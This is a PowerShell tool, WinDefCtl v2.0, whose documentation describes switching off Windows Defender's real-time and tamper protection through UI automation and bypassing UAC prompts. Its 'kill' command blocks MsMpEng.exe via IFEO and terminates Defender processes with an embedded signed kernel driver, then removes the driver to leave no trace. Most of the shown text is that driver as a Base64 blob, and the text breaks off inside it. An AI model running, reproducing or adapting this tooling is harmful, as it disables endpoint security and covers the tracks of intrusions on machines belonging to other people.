#Requires -RunAsAdministrator
<#
.SYNOPSIS
    WinDefCtl v2.0  -  Windows Defender 自动化与控制工具。

.DESCRIPTION
    单文件 PowerShell 脚本。通过 CLI 管理 Windows Defender：
    通过 UI 自动化翻转实时保护/篡改保护滑块，或通过 IFEO 阻止 MsMpEng.exe
    并借助嵌入的已签名内核驱动（kvckiller.sys，来自 Topaz，由 TPZ SOLUCOES 签名
    并交叉签名于 Microsoft）以 IOCTL 终止运行进程，从而完全禁用 Defender。

    驱动程序以 Base64 编码的 LZX CAB 内嵌于本脚本中，
    按需通过 expand.exe 解压至 %SystemRoot%\System32\drivers\，
    由 SCM 加载，使用一次后立即停止、删除服务并移除文件
    （执行 'kill' 后无残留痕迹）。

.PARAMETER Command
    rtp       实时保护滑块（UI 自动化）。
    tp        篡改保护滑块（UI 自动化）。
    kill      IFEO 阻止 + 内核终止 MsMpEng 和 SecurityHealthSystray。
    restore   移除 IFEO 阻止 + 启动 WinDefend 和 SecurityHealthService。
    status    打印 Defender 状态摘要。
    help      显示此帮助（也可使用无参数、/?, -?, -h, --help）。

.PARAMETER Action
    仅适用于 'rtp' 和 'tp' 命令：
    on        启用滑块。
    off       禁用滑块。
    status    读取当前滑块状态（默认）。

.EXAMPLE
    .\WinDefCtl-v2.ps1 status
    打印 Defender 状态（只读，无 UI 弹出）。

.EXAMPLE
    .\WinDefCtl-v2.ps1 rtp off
    通过 Windows 安全中心 UI 关闭实时保护滑块。

.EXAMPLE
    .\WinDefCtl-v2.ps1 tp on
    通过 Windows 安全中心 UI 开启篡改保护滑块。

.EXAMPLE
    .\WinDefCtl-v2.ps1 kill
    完全禁用 Defender：通过滑块关闭 RTP，应用 IFEO 阻止，
    加载 kvckiller.sys，通过 IOCTL 终止 MsMpEng 和 SecurityHealthSystray，
    移除驱动和服务，IFEO 阻止保持生效。

.EXAMPLE
    .\WinDefCtl-v2.ps1 restore
    撤销 'kill'：移除 IFEO 阻止，启动 WinDefend 和 SecurityHealthService，
    启动 SecurityHealthSystray。

.NOTES
    需要：完全管理员权限（已提升的 PowerShell）
    作者：Marek Wesolowski (WESMAR) - 2026
    驱动：kvckiller.sys（Topaz 签名填充，已签名）
    服务：wsftprm（内核，按需启动，使用后移除）
    设备：\\.\Warsaw_PM
    IOCTL：0x22201C（按 PID 终止，1036 字节输入缓冲区）
#>

param(
    [Parameter(Mandatory=$false, Position=0)]
    [string]$Command,

    [Parameter(Mandatory=$false, Position=1)]
    [string]$Action = 'status'
)

# 帮助路由——若无命令或请求帮助则打印帮助并退出
$helpAliases = @('', 'help', '/?', '-?', '-h', '--help', '/help', '/h')
if ($helpAliases -contains $Command.ToLower()) {
    Write-Host ''
    Write-Host '  WinDefCtl v2.0  -  Windows Defender 自动化与控制工具' -F Cyan
    Write-Host '  作者：Marek Wesolowski (WESMAR) - 2026' -F DarkGray
    Write-Host ''
    Write-Host '  用法：' -F Yellow
    Write-Host '    .\WinDefCtl-v2.ps1 <命令> [操作]'
    Write-Host ''
    Write-Host '  命令：' -F Yellow
    Write-Host '    rtp [on|off|status]   实时保护滑块（UI 自动化）'
    Write-Host '    tp  [on|off|status]   篡改保护滑块（UI 自动化）'
    Write-Host '    kill                  IFEO 阻止 + 内核终止 MsMpEng / SecurityHealthSystray'
    Write-Host '    restore               移除 IFEO 阻止 + 启动 WinDefend / SecurityHealth'
    Write-Host '    status                打印 Defender 状态摘要'
    Write-Host '    help                  显示此帮助（也可使用 /?, -?, -h, --help）'
    Write-Host ''
    Write-Host '  示例：' -F Yellow
    Write-Host '    .\WinDefCtl-v2.ps1 status'
    Write-Host '    .\WinDefCtl-v2.ps1 rtp off'
    Write-Host '    .\WinDefCtl-v2.ps1 tp  on'
    Write-Host '    .\WinDefCtl-v2.ps1 kill'
    Write-Host '    .\WinDefCtl-v2.ps1 restore'
    Write-Host ''
    Write-Host '  说明：' -F Yellow
    Write-Host '    * 需要完全管理员权限（已提升的 PowerShell）。'
    Write-Host '    * UI 切换操作会自动备份并恢复 UAC 设置以跳过提示。'
    Write-Host '    * "kill" 嵌入 Topaz 签名的驱动（kvckiller.sys，IOCTL 0x22201C）。'
    Write-Host '    * "kill" 使用后自动移除驱动文件和服务（无持久痕迹）。'
    Write-Host ''
    exit 0
}

# 帮助路由之后验证命令
$validCmds = @('rtp','tp','kill','restore','status')
if ($validCmds -notcontains $Command.ToLower()) {
    Write-Host "  [错误] 未知命令：'$Command'" -F Red
    Write-Host "  请运行 '.\WinDefCtl-v2.ps1 help' 查看用法。" -F Yellow
    exit 1
}
$Command = $Command.ToLower()

$validActs = @('on','off','status')
if ($validActs -notcontains $Action.ToLower()) {
    Write-Host "  [错误] 未知操作：'$Action'" -F Red
    Write-Host "  有效操作：on, off, status" -F Yellow
    exit 1
}
$Action = $Action.ToLower()

$ErrorActionPreference = 'Continue'

# ============================================================================
# 嵌入的 KVCKILLER.SYS  —— LZX CAB，Base64
# ============================================================================

$DriverCabB64 = @'
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
